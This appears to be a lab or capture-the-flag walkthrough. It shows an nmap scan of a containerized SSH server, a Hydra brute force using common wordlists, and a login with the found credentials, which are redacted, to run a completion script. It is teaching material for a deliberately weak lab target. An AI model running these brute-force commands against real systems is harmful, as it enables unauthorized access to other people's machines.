## Machines on network:

172\.28.1.4 **SSH Server**

172\.28.1.5 - **Kali Linux container**

## Overview of Challenge:
This challenge takes the user through using a password and username list to bruteforce an SSH server with weak credentials. 

**SSH** or secure shell is a tool and protocol for connecting securely between two hosts. In this challenge, our end goal will be to use the weak credentials found by bruteforcing the SSH server to run a completion script on our target machine. 

**Hydra** is the tool we will be using to run the brute force attack on the server. Hydra can be used for bruteforce attacks on many protocols, but in this challenge we will be using it for bruteforcing SSH.

**nmap** is a port scanning tool, we can use this tool to determine what is running and accessible on a target IP or network.

**Wordlists** are lists of common usernames, passwords, web endpoints, etc... that we can use to try and guess credentials, website addresses, and more.

Walkthrough:

## 1) Scanning the target

Our first objective will be to run a nmap port scan on our target machine. We can start the scan with the following command:

```nmap -sV 172.28.1.4```

The -sV specifies nmap to run a service scan on the target machine, whose IP is 172\.28.1.4 

This command will output the following:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-09 03:55 UTC
Nmap scan report for challengecomposefiles-bruteforce-ssh-1.webnet (172.28.1.4)
Host is up (0.000014s latency).
Not shown: 999 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
2222/tcp open  ssh     OpenSSH 9.6 (protocol 2.0)
MAC Address: 02:42:AC:1C:01:04 (Unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds

```
As we can see, nmap detects a OpenSSH server running on port 2222

## 2) Attacking the target
Now that we have found an open port to exploit, we can start our attack. For this attack we will use the "top-usernames-shortlist.txt" as our username wordlist, and the "2020-200_most_used_passwords.txt" as our password wordlist. We can use the following Hydra command to start the attack

```hydra -s 2222 -L top-usernames-shortlist.txt -P 2020-200_most_used_passwords.txt 172.28.1.4 ssh```

**"-s 2222"** specifies the port, by default Hydra will attack port 22 for SSH, as that is the default port for SSH, but our target is configured to listen on port 2222.

**"-L top-usernames-shortlist.txt"** specifies our username wordlist

**"-P 2020-200_most_used_passwords.txt"** specifies our password wordlist

**"172.28.1.4 ssh"** specifies our target IP, and tells Hydra to attack over SSH

This command will output
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-05-09 04:13:52
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 3349 login tries (l:17/p:197), ~210 tries per task
[DATA] attacking ssh://172.28.1.4:2222/
[STATUS] 156.00 tries/min, 156 tries in 00:01h, 3195 to do in 00:21h, 14 active
[2222][ssh] host: 172.28.1.4   login: <redacted>   password: <redacted> 
```
As shown in the output, we found a pair of working credentials! Now let's use them to gain access to the machine!

## 2) Accessing the target
Now that we have a set of credentials, lets login! 

We can login to the target over SSH with the following command (Just replace \<redacted> with the username Hydra found)

```ssh <redacted>@172.28.1.4 -p 2222```

You will be prompted for the password you just found, and then you will have a shell!

If we run ```ls -la``` in our new shell, we will get the following output

``` 526645b89d41:~$ ls -la
total 28
drwxr-xr-x 5 admin users 4096 May  9 04:13 .
drwxr-xr-x 1 root  root  4096 May  9 04:13 ..
drwx------ 2 admin users 4096 May  9 03:54 .ssh
-rwxr-xr-x 1 admin users   74 May  9 00:46 complete.sh
drwxr-xr-x 3 admin users 4096 May  9 03:54 logs
drwxr-xr-x 2 admin users 4096 May  9 04:13 ssh_host_keys
-rw-r--r-- 1 admin users    4 May  9 04:13 sshd.pid
526645b89d41:~$ 
```

As you can see, there appears to be a script called "complete.sh" that we can run. We can run it using the following command

```./complete.sh```

After running the script, we can check the challenge tracking page at http://172.28.1.2 and the challenge should be marked as complete!